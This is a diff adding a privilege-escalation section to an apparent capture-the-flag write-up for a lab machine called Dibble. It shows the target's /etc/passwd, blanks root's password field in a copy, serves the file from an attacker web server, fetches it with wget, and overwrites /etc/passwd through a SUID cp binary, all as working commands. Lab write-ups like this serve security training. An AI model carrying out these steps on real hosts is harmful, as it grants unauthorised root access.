@@ -205,3 +205,83 @@ connect to [192.168.45.228] from (UNKNOWN) [192.168.182.110] 42440
 whoami
 benjamin
 ~~~
+
+# Privilege Escalation
+
+I began enumerating for a path for Privilege Escalation by running linpeas.sh and identified the SUID bit is set on the 'cp' binary used to copy / replace files
+
+![Dibble](/assets/img/DibblePG(11).png)
+
+I then manually verified the SUID bit by running find / -perm -u=s -type f 2>/dev/null in which /usr/bin/cp appeared again
+
+With assistance from this [article](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/) I exploited a privilege escalaton root that uses the 'cp' binary 
+to replacing the current /etc/passwd file on the target host with our own manipulated passwd file to either add a user account with root privileges or remove the root accounts password altogether
+
+I started by displaying the current /etc/passwd file on the target host as shown below, then created a copy locally on my attack machine
+
+~~~shell
+sh-5.0$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+systemd-timesync:x:998:996:systemd Time Synchronization:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+chrony:x:996:993::/var/lib/chrony:/sbin/nologin
+benjamin:x:1000:1000::/home/benjamin:/bin/bash
+mongod:x:995:992:mongod:/var/lib/mongo:/bin/false
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
+~~~
+
+After creating the copy I manipulated the root account parameters and removed the 'x' parameter in the root user account which represents the root's password
+
+![Dibble](/assets/img/DibblePG(12).png)
+
+I then transferred the newly manipulated passwd file to the target host
+
+Create web server
+~~~shell
+┌──(kali㉿kali)-[~/Desktop/Dibble]
+└─$ sudo python3 -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+~~~
+
+Transfer the passwd file to the target host
+~~~shell
+sh-5.0$ wget http://192.168.45.228/passwd
+
+--2023-10-26 09:30:57--  http://192.168.45.228/passwd
+Connecting to 192.168.45.228:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1336 (1.3K) [application/octet-stream]
+Saving to: ‘passwd’
+
+passwd              100%[===================>]   1.30K  --.-KB/s    in 0s      
+
+2023-10-26 09:30:57 (383 MB/s) - ‘passwd’ saved [1336/1336]
+~~~
+
+Lastly I used the 'cp' binary to replace the existing /etc/passwd with our malicious passwd file
+
+sh-5.0$ cp passwd /etc/passwd
+
+Finally we can elevate privileges to root (it will no longer prompt for a password for root as we have removed the 'x' parameter in the /etc/passwd file)
+
+![Dibble](/assets/img/DibblePG(13).png)
